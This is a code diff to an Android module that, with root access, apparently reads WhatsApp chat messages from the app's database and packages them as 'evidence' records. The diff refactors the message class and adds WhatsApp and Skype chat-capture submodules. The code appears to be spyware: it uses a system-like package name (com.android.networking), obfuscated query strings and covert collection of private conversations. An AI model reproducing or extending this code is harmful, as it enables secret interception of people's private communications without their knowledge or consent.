@@ -43,6 +43,9 @@ import com.android.networking.evidence.Markup;
 import com.android.networking.file.AutoFile;
 import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerProcess;
+import com.android.networking.module.chat.ChatMessage;
+import com.android.networking.module.submodule.ChatSkype;
+import com.android.networking.module.submodule.ChatWhatsapp;
 import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 import com.android.networking.util.DateTime;
@@ -50,18 +53,7 @@ import com.android.networking.util.StringUtils;
 import com.android.networking.util.WChar;
 
 public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
-	class CMessage {
 
-		public String data;
-		public Date timestamp;
-		public boolean from_me;
-
-		public CMessage(String data, Date date, boolean from_me) {
-			this.data=data;
-			this.timestamp=date;
-			this.from_me=from_me;
-		}
-	}
 
 	private static final String TAG = "ModuleChat";
 
@@ -77,6 +69,11 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 	@Override
 	protected boolean parse(ConfModule conf) {
 		if (Status.self().haveRoot()) {
+			
+			SubModuleManager subModuleManager = new SubModuleManager(this);
+			subModuleManager.add( new ChatWhatsapp() );
+			subModuleManager.add( new ChatSkype() );
+		
 			return true;
 		} else {
 			if (Cfg.DEBUG) {
@@ -369,7 +366,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		// SELECT _id,key_remote_jid,data FROM messages where _id=$conversation AND key_remote_jid>$lastReadIndex
 		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, Messages.getString("f_4"));
 		
-		ArrayList<CMessage> messages = new ArrayList<CMessage>();
+		ArrayList<ChatMessage> messages = new ArrayList<ChatMessage>();
 		int lastRead = lastReadIndex;
 		while (cursor != null && cursor.moveToNext()) {		
 			int index = cursor.getInt(0); // f_4
@@ -384,7 +381,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (fetchMessages): " + StringUtils.byteArrayToHexString(data.getBytes()));
 				}
-				messages.add(new CMessage(data, new Date(timestamp), from_me));
+				messages.add(new ChatMessage(PROGRAM_WHATSAPP, data, new Date(timestamp), from_me));
 
 			}
 		}
@@ -393,13 +390,13 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		return lastRead;
 	}
 
-	private void saveEvidence(String conversation, ArrayList<CMessage> messages) {
+	private void saveEvidence(String conversation, ArrayList<ChatMessage> messages) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (saveEvidence): " + conversation);
 		}
 		
 		final ArrayList<byte[]> items = new ArrayList<byte[]>();
-		for (CMessage message : messages) {
+		for (ChatMessage message : messages) {
 			DateTime datetime = new DateTime(message.timestamp);
 
 			String peer = conversation.replaceAll(Messages.getString("f_9"),"");
@@ -407,7 +404,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			// TIMESTAMP
 			items.add(datetime.getStructTm());
 			// PROGRAM_TYPE
-			items.add(ByteArray.intToByteArray(PROGRAM_WHATSAPP));
+			items.add(ByteArray.intToByteArray(message.programId));
 			// FLAGS
 			int incoming = message.from_me? 0x00 : 0x01;
 			items.add(ByteArray.intToByteArray(incoming));
